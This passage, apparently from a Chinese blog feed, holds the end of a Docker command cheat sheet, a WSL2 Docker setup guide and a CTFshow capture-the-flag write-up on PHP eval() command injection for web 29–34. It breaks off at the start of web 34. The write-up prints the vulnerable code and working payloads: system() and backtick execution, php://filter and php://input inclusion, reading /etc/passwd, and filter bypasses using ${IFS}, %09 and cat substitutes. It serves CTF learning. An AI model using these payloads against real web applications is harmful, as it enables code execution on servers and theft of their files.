列出最近一次启动的container</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker ps -l </span><br></pre></td></tr></table></figure><ul><li> 显示一个运行的容器里面的进程信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker top Name/ID  </span><br></pre></td></tr></table></figure><ul><li>查看容器内部详情细节：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker inspect &lt;id/container_name&gt;</span><br></pre></td></tr></table></figure><ul><li> 在容器中安装新的程序</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker run image_name apt-get install -y app_name  </span><br></pre></td></tr></table></figure><blockquote><p>Note： 在执行apt-get  命令的时候，要带上-y参数。如果不指定-y参数的话，apt-get命令会进入交互模式，需要用户输入命令来进行确认，但在docker环境中是无法响应这种交互的。apt-get 命令执行完毕之后，容器就会停止，但对容器的改动不会丢失。</p></blockquote><ul><li> 从容器里面拷贝文件/目录到本地一个路径</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$docker cp Name:/container_path to_path  </span><br><span class="line">$docker cp ID:/container_path to_path</span><br></pre></td></tr></table></figure><ul><li>保存对容器的修改（commit） 当你对某一个容器做了修改之后（通过在容器中运行某一个命令），可以把对容器的修改保存下来，这样下次可以从保存后的最新状态运行该容器。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker commit ID new_image_name  </span><br></pre></td></tr></table></figure><blockquote><p>Note： image相当于类，container相当于实例，不过可以动态给实例安装新软件，然后把这个container用commit命令固化成一个image。</p></blockquote><ul><li>删除单个容器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker rm Name/ID </span><br></pre></td></tr></table></figure><blockquote><p>-f, –force=false(强制删除); -l, –link=false Remove the specified link and not  the underlying container; -v, –volumes=false Remove the volumes  associated to the container</p></blockquote><ul><li> 删除所有容器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker rm `docker ps -a -q`  </span><br></pre></td></tr></table></figure><ul><li> 停止、启动、杀死、重启一个容器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$docker stop Name/ID  </span><br><span class="line">$docker start Name/ID  </span><br><span class="line">$docker kill Name/ID  </span><br><span class="line">$docker restart name/ID</span><br></pre></td></tr></table></figure><h2 id="操作Image"><a href="#操作Image" class="headerlink" title="操作Image"></a>操作Image</h2><ul><li>列出镜像</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sudo docker images</span><br></pre></td></tr></table></figure><blockquote><p>-a, –all=false Show all images; –no-trunc=false Don’t truncate output; -q, –quiet=false Only show numeric IDs</p></blockquote><ul><li>从dockerhub检索image</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker search image_name</span><br></pre></td></tr></table></figure><ul><li> 下载image</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker pull image_name</span><br></pre></td></tr></table></figure><ul><li> 删除一个或者多个镜像; </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker rmi image_name  </span><br></pre></td></tr></table></figure><blockquote><p>-f, –force=false Force; –no-prune=false Do not delete untagged parents</p></blockquote><ul><li>显示一个镜像的历史;</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker history image_name</span><br></pre></td></tr></table></figure><ul><li>发布docker镜像</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker push new_image_name</span><br></pre></td></tr></table></figure><p>ps:要发布到私有Registry中的镜像，在镜像命名中需要带上Registry的域名（如果非80端口，同时需要带上端口号）比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker push dockerhub.yourdomain.com:443/hello.demo.kdemo:v1.0</span><br></pre></td></tr></table></figure><ul><li>拉取docker镜像</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker pull image_name</span><br></pre></td></tr></table></figure><h2 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h2><ul><li>查看docker0的网络(宿主机上操作)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ip a show docker0</span><br></pre></td></tr></table></figure><ul><li>查看容器的IP地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker inspect -f &#x27;&#123;&#123; .NetworkSettings.IPAddress &#125;&#125;&#x27; &lt;id、container_name&gt;</span><br></pre></td></tr></table></figure><p>附着到容器内部查看其内部ip：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ip a show eth0</span><br></pre></td></tr></table></figure><h3 id="构建容器："><a href="#构建容器：" class="headerlink" title="构建容器："></a>构建容器：</h3><p>使用当前目录的 Dockerfile 创建镜像，标签为 runoob/ubuntu:v1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t runoob/ubuntu:v1 .</span><br></pre></td></tr></table></figure><p>使用URL <strong>github.com/creack/docker-firefox</strong> 的 Dockerfile 创建镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build github.com/creack/docker-firefox</span><br></pre></td></tr></table></figure><p>也可以通过 -f Dockerfile 文件的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build -f /path/to/a/Dockerfile .</span><br></pre></td></tr></table></figure><p>在 Docker 守护进程执行 Dockerfile 中的指令前，首先会对 Dockerfile 进行语法检查，有语法错误时会返回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker build -t test/myapp .</span><br><span class="line">Sending build context to Docker daemon 2.048 kB</span><br><span class="line">Error response from daemon: Unknown instruction: RUNCMD</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WSL2 docker 配置</title>
      <link href="/2022/07/24/WSL2-docker-%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/07/24/WSL2-docker-%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="先决条件："><a href="#先决条件：" class="headerlink" title="先决条件："></a>先决条件：</h1><ul><li><p>确保计算机运行的是 Windows 10（<a href="ms-settings:windowsupdate">已更新到版本 2004</a> 的内部版本 18362 或更高版本）。</p></li><li><p><a href="https://docs.microsoft.com/zh-cn/windows/wsl/install">安装 WSL，并为在 WSL 2 中运行的 Linux 发行版设置用户名和密码</a>。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WSL 可以在 WSL 版本 1 或 WSL 2 模式下运行发行版。 可通过打开 PowerShell 并输入以下内容进行检查：`wsl -l -v`。 通过输入 `wsl --set-version  &lt;distro&gt; 2`，确保发行版设置为使用 WSL 2。 将 `&lt;distro&gt;` 替换为发行版名称（例如 Ubuntu 18.04）。</span><br><span class="line"></span><br><span class="line">在 WSL 版本 1 中，由于 Windows 和 Linux 之间的根本差异，Docker 引擎无法直接在 WSL 内运行，因此  Docker 团队使用 Hyper-V VM 和 LinuxKit 开发了一个替代解决方案。 但是，由于 WSL 2  现在在具有完整系统调用容量的 Linux 内核上运行，因此 Docker 可以在 WSL 2 中完全运行。 这意味着 Linux  容器可以在没有模拟的情况下以本机方式运行，从而在 Windows 和 Linux 工具之间实现更好的性能和互操作性。</span><br></pre></td></tr></table></figure><h1 id="安装-Docker-Desktop："><a href="#安装-Docker-Desktop：" class="headerlink" title="安装 Docker Desktop："></a>安装 Docker Desktop：</h1><p>借助 Docker Desktop for Windows 中支持的 WSL 2 后端，可以在基于 Linux 的开发环境中工作并生成基于 Linux 的容器，同时使用 Visual Studio Code 进行代码编辑和调试，并在 Windows 上的 Microsoft  Edge 浏览器中运行容器。</p><p>若要安装 Docker（在已<a href="https://docs.microsoft.com/zh-cn/windows/wsl/install">安装 WSL</a> 之后）：</p><ol><li><p>下载 <a href="https://docs.docker.com/docker-for-windows/wsl/#download">Docker Desktop</a> 并按照安装说明进行操作。</p></li><li><p>安装后，从 Windows 开始菜单启动 Docker Desktop，然后从任务栏的隐藏图标菜单中选择 Docker 图标。 右键单击该图标以显示 Docker 命令菜单，然后选择“设置”。</p><p><img src="https://docs.microsoft.com/zh-cn/windows/wsl/media/docker-starting.png" alt="Docker Desktop dashboard icon">3.确保在“设置”&gt;“常规”中选中“使用基于 WSL 2 的引擎”。</p></li></ol><p><img src="https://docs.microsoft.com/zh-cn/windows/wsl/media/docker-running.png" alt="Docker Desktop general settings"></p><p>4.通过转到“设置”&gt;“资源”&gt;“WSL 集成”，从要启用 Docker 集成的已安装 WSL 2 发行版中进行选择。</p><p><img src="https://docs.microsoft.com/zh-cn/windows/wsl/media/docker-dashboard.png" alt="Docker Desktop resource settings"></p><p>5.若要确认已安装 Docker，请打开 WSL 发行版（例如 Ubuntu），并通过输入 <code>docker --version</code> 来显示版本和内部版本号</p><p>6.通过使用 <code>docker run hello-world</code> 运行简单的内置 Docker 映像，测试安装是否正常工作</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow web 命令执行</title>
      <link href="/2022/07/08/CTFshow-web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/07/08/CTFshow-web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);   <span class="comment">//eval() 函数把字符串按照 PHP 代码来计算。</span></span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码："><a href="#一-分析代码：" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><code>  if(!preg_match(&quot;/flag/i&quot;, $c))</code></p><p>preg_match 函数用于执行一个正则表达式。/i意味着不区分大小写。这句话的含义是不能使用flag而且忽略了大小写，这句话过滤了flag</p><h2 id="二-解题过程："><a href="#二-解题过程：" class="headerlink" title="二.解题过程："></a>二.解题过程：</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>传入</p><p><code> ?c=echo &quot;a&quot;?&gt;&lt;?php system(&quot;ls&quot;);</code></p><p>可以发现有flag.php,结合伪协议可以将flag.php的内容给读出来</p><p><code> ?c=echo &#39;a &#39;?&gt;&lt;?php include&quot;$_GET[url]&quot;;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>1.首先查看一下php的版本，访问一下是7</p><p><code> ?c=phpinfo();</code></p><p>2.接下来查看一下发现没有禁用函数</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-08174928.png"></p><p>disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。（eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。）</p><p>3.列出当前目录的所有内容</p><p><code> ?c=print_r(scandir(&quot;./&quot;));</code></p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-08175421.png"></p><p>4.经过一系列的尝试发现可以采用写入文件的方法</p><p><code> ?c=system(“cat *php &gt;&gt;1.txt”);  *php是后缀为php，本句的意思是将后缀为php的写入2.txt中</code></p><p>5.之后访问/1.txt,即可得到flag</p><h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>涉及的知识点是<strong>通用符</strong><br>我们想要执行 cat flag.php，但是flag被过滤了,这时候就可以使用通配符<br>cat f*表示打开当前目录下所有 f开头的文件</p><p><code> ?c=echo system(&#39;cat f*&#39;);</code></p><h1 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-1"><a href="#一-分析代码：-1" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><code> if(!preg_match(&quot;/flag|system|php/i&quot;, $c))</code></p><p>过滤了flag，system,php</p><h2 id="二-解题过程：-1"><a href="#二-解题过程：-1" class="headerlink" title="二.解题过程："></a>二.解题过程：</h2><h3 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h3><p><code>?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h3 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h3><p>反引号执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo`cat * &gt;&gt; 1.txt`;</span><br></pre></td></tr></table></figure><p>访问1.txt，即可得到flag</p><h3 id="方法三：-1"><a href="#方法三：-1" class="headerlink" title="方法三："></a>方法三：</h3><p> 反引号执行系统命令<br> 使用通配符或*绕过过滤flag和php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">echo</span> `cat f*`;</span><br></pre></td></tr></table></figure><h1 id="web-31"><a href="#web-31" class="headerlink" title="web 31"></a>web 31</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-2"><a href="#一-分析代码：-2" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))</span><br></pre></td></tr></table></figure><p>过滤了flag,system,php,cat,sort,shell,空格,单引号，. 。</p><h2 id="二-解题思路："><a href="#二-解题思路：" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><h3 id="方法一：-2"><a href="#方法一：-2" class="headerlink" title="方法一："></a>方法一：</h3><p>1.涉及的知识点：</p><p><strong>空格过滤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%09 符号需要php环境</span><br><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat$&#123;IFS&#125;flag.txt</span><br><span class="line">cat$IFS$9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=$&#x27;\x20flag.txt&#x27;&amp;&amp;cat$kg</span><br><span class="line">(\x20转换成字符串就是空格，这里通过变量的方式巧妙绕过)</span><br></pre></td></tr></table></figure><p><strong>cat过滤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似。但在用 more 时候可能不能向上翻页，不能向上搜索指定字符串，而 less 却可以自由的向上向下翻页，也可以自由的向上向下搜索指定字符串。</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容。可以利用报错将文件内容带出来（-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.我们可以构造playload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">echo</span>(`tac%<span class="number">09</span>f*`);</span><br><span class="line">?c=<span class="keyword">echo</span>(`tail%<span class="number">09</span>f*`);</span><br><span class="line">需要查看源码：</span><br><span class="line">?c=<span class="keyword">echo</span>(`nl%<span class="number">09</span>f*`);</span><br><span class="line">?c=<span class="keyword">echo</span>(`less%<span class="number">09</span>f*`);</span><br><span class="line">?c=<span class="keyword">echo</span>(`more%<span class="number">09</span>f*`);</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h3><p> 采用include结合<a href="https://blog.csdn.net/nzjdsds/article/details/82461043">伪协议</a>进行包含读取</p><blockquote><p>?c=include”$_GET[url]”?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</p></blockquote><h1 id="web-32"><a href="#web-32" class="headerlink" title="web 32"></a>web 32</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码"><a href="#一-分析代码" class="headerlink" title="一.分析代码"></a>一.分析代码</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-09201640.png"></p><p>对以上进行了过滤</p><h2 id="二-解题思路：-1"><a href="#二-解题思路：-1" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>php中有很多不用括号的函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">die</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;etc/passwd&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>尝试<code>include&quot;/etc/passwd&quot;?&gt;</code>可以执行，且代码没有过滤<code>$</code>，用c=include<code>&quot;$_POST[x]&quot;?&gt;</code>或者c=include<code>&quot;$_GET[x]&quot;?&gt;</code>然后用php伪协议将include包含的文件在页面上显示出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include&quot;$_GET[url]&quot;?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web-33"><a href="#web-33" class="headerlink" title="web 33"></a>web 33</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-3"><a href="#一-分析代码：-3" class="headerlink" title="一.分析代码："></a>一.分析代码：</h2><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-09204247.png"></p><p>对以上进行了过滤</p><h2 id="二-解题思路：-2"><a href="#二-解题思路：-2" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><h3 id="方法一：-3"><a href="#方法一：-3" class="headerlink" title="方法一："></a>方法一：</h3><p>思路同上，但是本题过滤了单双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[url]?&gt;&amp;url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="方法二：-2"><a href="#方法二：-2" class="headerlink" title="方法二："></a>方法二：</h3><p>使用input伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[url]?&gt;&amp;url=php://input </span><br></pre></td></tr></table></figure><p>post部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;more flag.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure><h1 id="web-34"><a href="#web-34" class="headerlink" title="web 34"></a>web 34</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-分析代码：-4"><a 